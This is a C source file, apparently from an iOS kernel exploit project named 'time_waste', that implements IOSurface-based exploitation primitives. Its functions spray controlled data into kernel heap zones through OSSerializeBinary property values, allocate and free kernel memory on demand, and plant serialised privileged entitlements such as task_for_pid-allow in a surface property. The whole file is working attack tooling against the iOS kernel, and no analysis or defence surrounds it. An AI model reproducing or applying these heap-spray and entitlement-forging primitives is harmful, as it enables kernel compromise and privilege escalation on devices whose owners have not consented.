//
//  IOSurface_stuff.c
//  time_waste
//
//  Created by Jake James on 2/22/20.
//  Copyright Â© 2020 Jake James. All rights reserved.
//

#import "IOSurface_stuff.h"
//#import "utilsZS.h"
#include "mycommon.h"
#include <dlfcn.h>
#include <assert.h>
#include <pthread.h>
#include <string.h>


uint32_t pagesize;
io_connect_t IOSurfaceRoot;
io_service_t IOSurfaceRootUserClient;
uint32_t IOSurface_ID;


struct IOSurfaceLockResultCV {
    //uint8_t _pad1[0x18];
    uint8_t *mem;
    uint8_t *shared_B0;
    uint8_t *shared_40;
    uint32_t surface_id;
    uint8_t _pad2[0xf60-0x18-0x4];
};

struct IOSurfaceValueArgsCV {
    uint32_t surface_id;
    uint32_t field_4;
    union {
        uint32_t xml[0];
        char string[0];
    };
};


// This value encodes to 0x00ffffff, so any larger value will cause IOSurface_property_key() to
// wrap and collide with a smaller value.
#define MAX_IOSURFACE_PROPERTY_INDEX    (0x00fd02fe)


static uint32_t IOSurface_property_index = 0;

// Is the IOSurface subsystem initialized?
static bool IOSurface_initialized;

// The IOSurfaceRoot service.
mach_port_t IOSurfaceRootCV;

// An IOSurfaceRootUserClient instance.
mach_port_t IOSurfaceRootUserClientCV;

// The ID of the IOSurface we're using.
uint32_t IOSurface_idCV;

mach_port_t IOSurface_worker_uc;
uint32_t IOSurface_worker_id;

// ---- External methods --------------------------------------------------------------------------

static bool
IOSurface_set_value(const struct IOSurfaceValueArgsCV *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    kern_return_t kr = IOConnectCallMethod(
            IOSurface_worker_uc,
            9, // set_value
            NULL, 0,
            args, args_size,
            NULL, NULL,
            &result, &result_size);
    if (kr != KERN_SUCCESS) {
        printf("Failed to %s value in %s: 0x%x", "set", "IOSurface\n", kr);
        return false;
    }
    return true;
}

// ---- Initialization ----------------------------------------------------------------------------

uint32_t iosurface_create_fast(void)
{
    kern_return_t kr;
    struct IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) g_exp.pagesize };//pagesizeCV };
    struct IOSurfaceLockResultCV lock_result;
    size_t lock_result_size = sizeof(lock_result);
    kr = IOConnectCallMethod(
            IOSurfaceRootUserClientCV,
            6, // create_surface_client_fast_path
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, &lock_result_size);
    if (kr != KERN_SUCCESS) {
        printf("could not create %s: 0x%x", "IOSurfaceClient", kr);
        return 0;
    }
    return lock_result.surface_id;
}

uint32_t iosurface_s_get_ycbcrmatrix(void)
{
    uint64_t i_scalar[1] = { 1 }; // fixed, first valid client obj
    uint64_t o_scalar[1];
    uint32_t i_count = 1;
    uint32_t o_count = 1;

    kern_return_t kr = IOConnectCallMethod(
            IOSurfaceRootUserClientCV,
            8, // s_get_ycbcrmatrix
            i_scalar, i_count,
            NULL, 0,
            o_scalar, &o_count,
            NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("s_get_ycbcrmatrix error: 0x%x", kr);
        return 0;
    }
    return (uint32_t)o_scalar[0];
}

void iosurface_s_set_indexed_timestamp(uint64_t v)
{
    uint64_t i_scalar[3] = {
        1, // fixed, first valid client obj
        0, // index
        v, // value
    };
    uint32_t i_count = 3;

    kern_return_t kr = IOConnectCallMethod(
            IOSurfaceRootUserClientCV,
            33, // s_set_indexed_timestamp
            i_scalar, i_count,
            NULL, 0,
            NULL, NULL,
            NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("s_set_indexed_timestamp error: 0x%x", kr);
    }
}


static void build_essential_entitlements(void)
{
    CFMutableArrayRef array;
    CFDictionaryRef dict;
    CFStringRef key = CFSTR("essential-entitlements");
    CFStringRef ent_keys[] = {
        CFSTR("task_for_pid-allow"),
        CFSTR("com.apple.system-task-ports"),
        CFSTR("com.apple.private.security.container-manager"),
        CFSTR("com.apple.private.security.storage.AppBundles"),
    };
    CFTypeRef ent_values[] = {
        kCFBooleanTrue,
        kCFBooleanTrue,
        kCFBooleanTrue,
        kCFBooleanTrue,
    };

    dict = CFDictionaryCreate(NULL, (void *)ent_keys, (void *)ent_values, arrayn(ent_keys),
            &kCFCopyStringDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    array = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
    CFArrayAppendValue(array, dict);
    CFArrayAppendValue(array, key);

    void *hIOKit = dlopen("/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_LOCAL);
    static CFDataRef (*IOCFSerialize)(CFTypeRef, uint32_t);
    IOCFSerialize = dlsym(hIOKit, "IOCFSerialize");
    assert(IOCFSerialize != NULL);

    CFDataRef data = IOCFSerialize(array, 1);

    size_t len = CFDataGetLength(data);
    struct IOSurfaceValueArgsCV *args = malloc(sizeof(*args) + len);
    args->surface_id = IOSurface_worker_id;
    args->field_4 = 0;
    memcpy(args->xml, CFDataGetBytePtr(data), len);
    IOSurface_set_value(args, sizeof(*args) + len);
    free(args);

    CFRelease(dict);
    CFRelease(array);
    CFRelease(data);
}

bool
IOSurface_init(void) {
    if (IOSurface_initialized) {
        return true;
    }
    IOSurfaceRootCV = IOServiceGetMatchingService(
            kIOMasterPortDefault,
            IOServiceMatching("IOSurfaceRoot"));
    if (IOSurfaceRootCV == MACH_PORT_NULL) {
        printf("could not find %s", "IOSurfaceRoot\n");
        return false;
    }
    kern_return_t kr = IOServiceOpen(
            IOSurfaceRootCV,
            mach_task_self(),
            0,
            &IOSurfaceRootUserClientCV);
    if (kr != KERN_SUCCESS) {
        printf("could not open %s", "IOSurfaceRootUserClient\n");
        return false;
    }
    kr = IOServiceOpen(IOSurfaceRootCV, mach_task_self(), 0, &IOSurface_worker_uc);
    if (kr != KERN_SUCCESS) {
        printf("could not open %s", "IOSurfaceRoot worker UserClient\n");
        return false;
    }
    struct IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) g_exp.pagesize };//pagesizeCV };//pagesize };
    struct IOSurfaceLockResultCV lock_result;
    size_t lock_result_size = sizeof(lock_result);
    kr = IOConnectCallMethod(
            IOSurfaceRootUserClientCV,
            6, // create_surface_client_fast_path
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, &lock_result_size);
    if (kr != KERN_SUCCESS) {
        printf("could not create %s: 0x%x", "IOSurfaceClient\n", kr);
        return false;
    }
    IOSurface_idCV = lock_result.surface_id;
    kr = IOConnectCallMethod(
            IOSurface_worker_uc,
            6, // create_surface_client_fast_path
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, &lock_result_size);
    if (kr != KERN_SUCCESS) {
        printf("could not create %s: 0x%x", "IOSurfaceClient worker\n", kr);
        return false;
    }
    IOSurface_worker_id = lock_result.surface_id;
    build_essential_entitlements();
    IOSurface_initialized = true;
    return true;
}

void
IOSurface_deinitCV(void) {
    assert(IOSurface_initialized);
    IOSurface_initialized = false;
    IOSurface_idCV = 0;
    IOServiceClose(IOSurfaceRootUserClientCV);
    IOObjectRelease(IOSurfaceRootCV);
}




int init_IOSurface() {
    kern_return_t ret = _host_page_size(mach_host_self(), (vm_size_t*)&pagesize);
    if (ret) {
        printf("[-] Failed to get page size! 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    printf("[i] page size: 0x%x\n", pagesize);
    
    IOSurfaceRoot = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(IOSurfaceRoot)) {
        printf("[-] Failed to find IOSurfaceRoot service\n");
        return KERN_FAILURE;
    }
    
    ret = IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSurfaceRootUserClient);
    if (ret || !MACH_PORT_VALID(IOSurfaceRootUserClient)) {
        printf("[-] Failed to open IOSurfaceRootUserClient: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    struct IOSurfaceFastCreateArgs create_args = {
        .alloc_size = pagesize
    };
    
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = 0xdd0;//koffset_TW(IOSURFACE_CREATE_OUTSIZE_TW);
    
    ret = IOConnectCallMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_create_surface_selector, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);
    if (ret) {
        printf("[-] Failed to create IOSurfaceClient: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    IOSurface_ID = lock_result.surface_id;
    
    return 0;
}

int IOSurface_setValue(struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_set_value_selector, NULL, 0, args, args_size, NULL, NULL, &result, &result_size);
    if (ret) {
        printf("[-][IOSurface] Failed to set value: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_getValue(struct IOSurfaceValueArgs *args, int args_size, struct IOSurfaceValueArgs *output, size_t *out_size) {
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_get_value_selector, NULL, 0, args, args_size, NULL, NULL, output, out_size);
    if (ret) {
        printf("[-][IOSurface] Failed to get value: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_removeValue(struct IOSurfaceValueArgs *args, size_t args_size) {
    struct IOSurfaceValueResultArgs result;
    size_t result_size = sizeof(result);
    
    kern_return_t ret = IOConnectCallMethod(IOSurfaceRootUserClient, IOSurfaceRootUserClient_remove_value_selector, NULL, 0, args, args_size, NULL, NULL, &result, &result_size);
    if (ret) {
        printf("[-][IOSurface] Failed to remove value: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    return 0;
}

int IOSurface_remove_property(uint32_t key) {
    uint32_t argsSz = sizeof(struct IOSurfaceValueArgs) + 2 * sizeof(uint32_t);
    struct IOSurfaceValueArgs *args = malloc(argsSz);
    bzero(args, argsSz);
    args->surface_id = IOSurface_ID;
    args->binary[0] = key;
    args->binary[1] = 0;
    int ret = IOSurface_removeValue(args, 16);
    free(args);
    return ret;
}

int IOSurface_kalloc(void *data, uint32_t size, uint32_t kalloc_key) {
    if (size - 1 > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + ((size + 3)/4) * 4 + 6 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeString | (size - 1);
    memcpy(&args->binary[i], data, size);
    i += (size + 3)/4;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kalloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key) {
    if (size - 1 > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    if (count > 0x00ffffff) {
        printf("[-][IOSurface] Count too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 + count * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeArray | count;
    for (int c = 0; c < count; c++) {
        args->binary[i++] = kOSSerializeString | (size - 1) | ((c == count - 1) ? kOSSerializeEndCollection : 0);
        memcpy(&args->binary[i], data, size);
        i += (size + 3)/4;
    }
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_empty_kalloc(uint32_t size, uint32_t kalloc_key) {
    uint32_t capacity = size / 16;
    
    if (capacity > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + 9 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeDictionary | capacity;
    args->binary[i++] = kOSSerializeSymbol | 4;
    args->binary[i++] = 0x00aabbcc;
    args->binary[i++] = kOSSerializeBoolean | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kmem_alloc(void *data, uint32_t size, uint32_t kalloc_key) {
    if (size < pagesize) {
        printf("[-][IOSurface] Size too small for kmem_alloc\n");
        return KERN_FAILURE;
    }
    if (size > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + ((size + 3)/4) * 4 + 6 * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeData | size;
    memcpy(&args->binary[i], data, size);
    i += (size + 3)/4;
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

int IOSurface_kmem_alloc_spray(void *data, uint32_t size, int count, uint32_t kalloc_key) {
    if (size < pagesize) {
        printf("[-][IOSurface] Size too small for kmem_alloc\n");
        return KERN_FAILURE;
    }
    if (size > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    if (count > 0x00ffffff) {
        printf("[-][IOSurface] Size too big for OSUnserializeBinary\n");
        return KERN_FAILURE;
    }
    
    size_t args_size = sizeof(struct IOSurfaceValueArgs) + count * (((size + 3)/4) * 4) + 6 * 4 + count * 4;
    
    struct IOSurfaceValueArgs *args = calloc(1, args_size);
    args->surface_id = IOSurface_ID;
    
    int i = 0;
    args->binary[i++] = kOSSerializeBinarySignature;
    args->binary[i++] = kOSSerializeArray | 2 | kOSSerializeEndCollection;
    args->binary[i++] = kOSSerializeArray | count;
    for (int c = 0; c < count; c++) {
        args->binary[i++] = kOSSerializeData | size | ((c == count - 1) ? kOSSerializeEndCollection : 0);
        memcpy(&args->binary[i], data, size);
        i += (size + 3)/4;
    }
    args->binary[i++] = kOSSerializeSymbol | 5 | kOSSerializeEndCollection;
    args->binary[i++] = kalloc_key;
    args->binary[i++] = 0;
    
    kern_return_t ret = IOSurface_setValue(args, args_size);
    free(args);
    return ret;
}

void term_IOSurface() {
    if (IOSurfaceRoot) IOObjectRelease(IOSurfaceRoot);
    if (IOSurfaceRootUserClient) IOServiceClose(IOSurfaceRootUserClient);
    
    IOSurfaceRoot = 0;
    IOSurfaceRootUserClient = 0;
    IOSurface_ID = 0;
}
